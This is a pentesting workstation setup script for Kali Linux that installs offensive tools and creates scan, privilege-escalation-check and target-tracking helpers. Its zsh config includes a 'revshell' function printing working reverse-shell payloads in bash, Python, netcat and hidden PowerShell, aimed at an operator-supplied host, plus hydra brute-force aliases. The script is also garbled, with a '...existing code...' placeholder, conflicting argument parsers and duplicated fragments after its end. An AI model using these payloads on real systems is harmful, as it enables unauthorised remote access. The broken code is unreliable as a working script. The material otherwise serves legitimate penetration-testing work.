    curl -LO "https://dl.k8s.io/release/$(curl -L -s https://dl.k8s.io/release/stable.txt)/bin/linux/amd64/kubectl"
    sudo install -o root -g root -m 0755 kubectl /usr/local/bin/kubectl
    rm kubectl
    cd ~/pentesting/tools
    curl -L -o bloodhound.zip https://github.com/BloodHoundAD/BloodHound/releases/latest/download/BloodHound-linux-x64.zip
    unzip bloodhound.zip && rm bloodhound.zip
    git clone --recurse-submodules https://github.com/cobbr/Covenant 2>/dev/null || true
    wget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.7.7_linux_amd64.gz
    gunzip chisel_1.7.7_linux_amd64.gz
    chmod +x chisel_1.7.7_linux_amd64
    sudo mv chisel_1.7.7_linux_amd64 /usr/local/bin/chisel
    wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
    chmod +x pspy64
    cd ~
    print_success "Advanced pentesting tools installed"
}

# === ADVANCED SCRIPTS ===
create_advanced_scripts() {
    print_status "Creating advanced automation scripts..."
    # Target initialization script
    cat > ~/pentesting/scripts/init_target.sh << 'EOF'
#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage: $0 <target_name> [IP]"
    exit 1
fi
TARGET_NAME=$1
TARGET_IP=$2
DATE=$(date '+%Y-%m-%d')
TARGET_DIR="$HOME/pentesting/targets/$TARGET_NAME"
mkdir -p "$TARGET_DIR"/{recon,scans,exploits,loot,screenshots,notes,reports}
cat > "$TARGET_DIR/notes/README.md" << EOL
# Target: $TARGET_NAME

**Date Started:** $DATE  
**Target IP:** $TARGET_IP  
**Status:** In Progress

## Initial Information
- [ ] Domain/Hostname: 
- [ ] Operating System: 
- [ ] Key Services: 

## Reconnaissance
- [ ] Nmap scan completed
- [ ] Directory enumeration
- [ ] Service enumeration
- [ ] Vulnerability assessment

## Exploitation
- [ ] Initial foothold
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Cleanup
- [ ] Remove artifacts
- [ ] Document findings
EOL
cat > "$TARGET_DIR/scan.sh" << EOL
#!/bin/bash
TARGET_IP="$TARGET_IP"
SCAN_DIR="\$(dirname \$0)/scans"
DATE=\$(date '+%Y%m%d_%H%M%S')
echo "Starting automated scan for $TARGET_NAME (\$TARGET_IP)"
echo "Results will be saved in: \$SCAN_DIR"
mkdir -p "\$SCAN_DIR"
nmap -sS -sV -O -T4 --top-ports 1000 -oA "\$SCAN_DIR/quick_\$DATE" \$TARGET_IP
nmap -sS -p- -T4 -oA "\$SCAN_DIR/full_\$DATE" \$TARGET_IP &
nmap -sU --top-ports 100 -T4 -oA "\$SCAN_DIR/udp_\$DATE" \$TARGET_IP &
wait
echo "[+] Nmap scans completed"
if nmap -p 80,443,8080,8443 \$TARGET_IP | grep -q "open"; then
    echo "[+] Web ports detected, running web enumeration..."
    gobuster dir -u http://\$TARGET_IP -w /usr/share/seclists/Discovery/Web-Content/common.txt -o "\$SCAN_DIR/gobuster_\$DATE.txt" &
    nikto -h \$TARGET_IP -o "\$SCAN_DIR/nikto_\$DATE.txt" &
    wait
fi
echo "[+] All scans completed!"
echo "Check results in: \$SCAN_DIR"
EOL
chmod +x "$TARGET_DIR/scan.sh"
echo "Target $TARGET_NAME initialized!"
echo "Directory: $TARGET_DIR"
cd "$TARGET_DIR"
ls -la
EOF
    # Network discovery script
    cat > ~/pentesting/scripts/discover_network.sh << 'EOF'
#!/bin/bash
if [ $# -eq 0 ]; then
    echo "Usage: $0 <network_cidr> [interface]"
    echo "Example: $0 192.168.1.0/24 eth0"
    exit 1
fi
NETWORK=$1
INTERFACE=${2:-$(ip route | grep default | awk '{print $5}' | head -n1)}
echo "Discovering network: $NETWORK"
echo "Using interface: $INTERFACE"
OUTPUT_DIR="./network_discovery_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTPUT_DIR"
nmap -sn $NETWORK -oA "$OUTPUT_DIR/host_discovery"
LIVE_HOSTS=$(grep "Nmap scan report" "$OUTPUT_DIR/host_discovery.nmap" | awk '{print $5}')
echo "[+] Live hosts found:"
echo "$LIVE_HOSTS"
for host in $LIVE_HOSTS; do
    echo "Scanning $host..."
    nmap -sS -T4 --top-ports 100 $host -oA "$OUTPUT_DIR/portscan_${host}" &
done
wait
echo "[+] Network discovery completed!"
echo "Results saved in: $OUTPUT_DIR"
EOF
    # Privilege escalation checker
    cat > ~/pentesting/scripts/privesc_check.sh << 'EOF'
#!/bin/bash
echo "=========================================="
echo "     PRIVILEGE ESCALATION CHECKER"
echo "=========================================="
echo "[+] System Information:"
uname -a
echo ""
echo "[+] Current User and Groups:"
id
echo ""
echo "[+] Sudo Permissions:"
sudo -l 2>/dev/null || echo "Cannot check sudo permissions"
echo ""
echo "[+] SUID/SGID Files:"
find / -perm -4000 -type f 2>/dev/null | head -20
echo ""
echo "[+] World-writable Directories:"
find / -type d -perm -002 2>/dev/null | head -10
echo ""
echo "[+] Running Processes:"
ps aux | grep -v "\[" | head -15
echo ""
echo "[+] Network Connections:"
netstat -tuln 2>/dev/null || ss -tuln
echo ""
echo "[+] Cron Jobs:"
ls -la /etc/cron* 2>/dev/null
crontab -l 2>/dev/null || echo "No user crontab"
echo ""
echo "[+] Environment Variables:"
env | grep -E "(PATH|LD_|PWD|HOME)" | head -10
echo ""
echo "=========================================="
echo "Manual checks recommended:"
echo "- Check /etc/passwd for unusual users"
echo "- Look for config files with credentials"
echo "- Check kernel version for exploits"
echo "- Examine running services"
echo "=========================================="
EOF
    chmod +x ~/pentesting/scripts/*.sh
    print_success "Advanced automation scripts created"
}

# === ADVANCED ALIASES ===
setup_advanced_aliases() {
    print_status "Setting up advanced aliases and functions..."
    mkdir -p ~/.config/zsh
    cat > ~/.config/zsh/pentesting_advanced.zsh << 'EOF'
# Advanced Pentesting Functions and Aliases

target() {
    if [[ -z "$1" ]]; then
        echo "Usage: target <name> [IP]"
        return 1
    fi
    ~/pentesting/scripts/init_target.sh "$1" "$2"
}
revshell() {
    if [[ -z "$1" ]] || [[ -z "$2" ]]; then
        echo "Usage: revshell <LHOST> <LPORT>"
        echo "Generates common reverse shell payloads"
        return 1
    fi
    local lhost="$1"
    local lport="$2"
    echo "=== REVERSE SHELL PAYLOADS ==="
    echo ""
    echo "Bash:"
    echo "bash -i >& /dev/tcp/$lhost/$lport 0>&1"
    echo ""
    echo "Python:"
    echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$lhost\",$lport));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    echo ""
    echo "NC (traditional):"
    echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $lhost $lport >/tmp/f"
    echo ""
    echo "PowerShell:"
    echo "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"$lhost\",$lport);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2  = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
}
qscan() { if [[ -z "$1" ]]; then echo "Usage: qscan <target>"; return 1; fi; nmap -sS -sV -O -T4 --top-ports 1000 "$1"; }
fscan() { if [[ -z "$1" ]]; then echo "Usage: fscan <target>"; return 1; fi; nmap -sS -sC -sV -O -T4 -p- "$1"; }
wscan() { if [[ -z "$1" ]]; then echo "Usage: wscan <target>"; return 1; fi; nmap -sS -sV -p80,443,8080,8443,8000,3000,5000 --script=http-* "$1"; }

alias cat='bat --paging=never'
alias ls='exa --icons'
alias ll='exa -lah --icons --group-directories-first'
alias la='exa -la --icons'
alias lt='exa --tree --level=2 --icons'
alias grep='rg'
alias find='fd'
alias du='dust'
alias ps='procs'
alias top='btop'
alias myip='curl -s ifconfig.me && echo'
alias localip='ip addr show | grep "inet " | grep -v 127.0.0.1 | awk "{print \$2}" | cut -d/ -f1'
alias ports='ss -tuln'
alias connections='ss -tuln'
alias listening='ss -tuln | grep LISTEN'
alias webserver='python3 -m http.server'
alias smbserver='impacket-smbserver share . -smb2support'
alias ftpserver='python3 -m pyftpdlib -p 21'
alias ..='cd ..'
alias ...='cd ../..'
alias ....='cd ../../..'
alias pendir='cd ~/pentesting'
alias tools='cd ~/pentesting/tools'
alias targets='cd ~/pentesting/targets'
alias gs='git status'
alias ga='git add'
alias gc='git commit -m'
alias gp='git push'
alias gl='git pull'
alias tl='tmux list-sessions'
alias ta='tmux attach-session -t'
alias tn='tmux new-session -s'
alias dps='docker ps'
alias dpa='docker ps -a'
alias di='docker images'
alias dr='docker run --rm -it'
alias msfconsole='msfconsole -q'
alias msfdb='sudo msfdb'
alias sploits='searchsploit'
alias gobuster-common='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/common.txt -u'
alias gobuster-medium='gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u'
alias ffuf-common='ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u'
alias hydra-ssh='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://'
alias hydra-http='hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt http-get://'
alias psmem='ps aux --sort=-%mem | head -10'
alias pscpu='ps aux --sort=-%cpu | head -10'
alias diskspace='du -h --max-depth=1 | sort -hr'
alias largest='find . -type f -exec ls -sh {} + | sort -rh | head -10'
alias netwatch='watch -n 1 "ss -tuln"'
alias bandwidth='iftop -i eth0'
alias taillog='tail -f /var/log/syslog'
alias errors='journalctl -p 3 -xb'
EOF
    # Add source to .zshrc if not already there
    if ! grep -q "pentesting_advanced.zsh" ~/.zshrc 2>/dev/null; then
        echo "" >> ~/.zshrc
        echo "# Load advanced pentesting configuration" >> ~/.zshrc
        echo "[[ -f ~/.config/zsh/pentesting_advanced.zsh ]] && source ~/.config/zsh/pentesting_advanced.zsh" >> ~/.zshrc
    fi
    print_success "Advanced aliases and functions configured"
}

# === TMUX CONFIG ===
setup_tmux_config() {
    print_status "Setting up tmux configuration..."
    cat > ~/.tmux.conf << 'EOF'
# Tmux configuration for pentesting
set -g prefix C-a
unbind C-b
bind C-a send-prefix
set -g mouse on
set -g base-index 1
setw -g pane-base-index 1
bind r source-file ~/.tmux.conf \; display-message "Config reloaded!"
bind | split-window -h
bind - split-window -v
bind h select-pane -L
bind j select-pane -D
bind k select-pane -U
bind l select-pane -R
set -g status-bg black
set -g status-fg white
set -g status-left '[#S] '
set -g status-right '#(whoami)@#H %Y-%m-%d %H:%M'
set -g status-left-length 20
set -g status-right-length 40
setw -g window-status-current-bg red
setw -g window-status-current-fg white
setw -g window-status-current-attr bold
set -g history-limit 10000
set -sg escape-time 0
setw -g monitor-activity on
set -g visual-activity on
EOF
    print_success "Tmux configuration created"
}

# Argument parsing for flexible execution
SKIP_TOOLS=false
SKIP_ZSH=false
SKIP_DOCKER=false
SKIP_ADVANCED=false

while [[ "$#" -gt 0 ]]; do
    case $1 in
        --skip-tools) SKIP_TOOLS=true ;;
        --skip-zsh) SKIP_ZSH=true ;;
        --skip-docker) SKIP_DOCKER=true ;;
        --skip-advanced) SKIP_ADVANCED=true ;;
        --help)
            echo "Usage: $0 [--skip-tools] [--skip-zsh] [--skip-docker] [--skip-advanced]"
            exit 0
            ;;
        *)
            echo "Unknown parameter passed: $1"
            exit 1
            ;;
    esac
    shift
done

# Enhanced main function with better initialization
main() {
    local -A opts
    local skip_all=false
    local OPTIND
    
    # Initialize script environment
    set -o errexit
    set -o nounset
    set -o pipefail
    
    # Process command line arguments using getopts
    while getopts ":h-:" opt; do
        case $opt in
            -)
                case "${OPTARG}" in
                    skip-all)
                        skip_all=true
                        ;;
                    skip-*)
                        local key="${OPTARG#skip-}"
                        opts[$key]=true
                        ;;
                    help)
                        show_help
                        return 0
                        ;;
                    *)
                        print_error "Unknown option --${OPTARG}"
                        show_help
                        return 1
                        ;;
                esac
                ;;
            h)
                show_help
                return 0
                ;;
            *)
                print_error "Invalid option: -$OPTARG"
                show_help
                return 1
                ;;
        esac
    done
    shift $((OPTIND-1))

    # Initialize logging with rotation
    if [[ -f "$LOG_FILE" ]]; then
        mv "$LOG_FILE" "$LOG_FILE.old"
    fi
    : > "$LOG_FILE"
    
    print_status "Starting setup (Version: $VERSION)"
    print_status "Logging to $LOG_FILE"

    # Script header
    cat << 'EOF'
===============================================
  Kali Linux Pentesting Setup Script
  Web & Server Pentesting Focus
===============================================
EOF

    # Pre-flight checks
    check_os
    detect_pkg_manager
    check_root
    check_dependencies
    check_structure
    
    # Ensure script directory is writable
    if [ ! -w "$SCRIPT_DIR" ]; then
        print_error "Script directory is not writable: $SCRIPT_DIR"
        exit 1
    fi
    
    check_config || {
        print_error "Configuration check failed"
        exit 1
    }
    
    # Create all required directories
    create_directories
    
    # Continue with the rest of the installation...
    # ...existing code...
}

# Ensure the script is being run, not sourced
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
    trap 'cleanup_handler' EXIT
    trap 'interrupt_handler' INT TERM
    main "$@"
fi
    echo "5. Shared folders (if configured) are accessible via 'shared' alias"
    echo ""
    print_status "IMPORTANT: To apply all changes, please restart your terminal or run:"
    echo "    source ~/.zshrc"
    echo ""
    print_status "Quick start commands:"
    echo "  - pentest       # Activate pentesting Python environment"
    echo "  - webapp        # Activate web app Python environment"
    echo "  - pendir        # Go to pentesting directory"
    echo "  - tools         # Go to tools directory"
    echo "  - shared        # Go to VMware shared folders"
    echo "  - newscreen     # Create new screen session"
    echo "  - term          # Launch Terminator"
    echo "  - termconfig    # Open Terminator preferences"
    echo "  - update-tools  # Update all git tools"
    echo ""
    print_success "Happy hacking! 🎯"
}

# Ensure the script is being run, not sourced
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
    trap 'cleanup_handler' EXIT
    trap 'interrupt_handler' INT TERM
    main "$@"
fi
    echo ""
    print_success "Happy hacking! 🎯"
}

# Ensure the script is being run, not sourced
if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
    trap 'err_handler $? $LINENO "$BASH_COMMAND"' ERR
    trap 'cleanup_handler' EXIT
    trap 'interrupt_handler' INT TERM
    main "$@"
fi
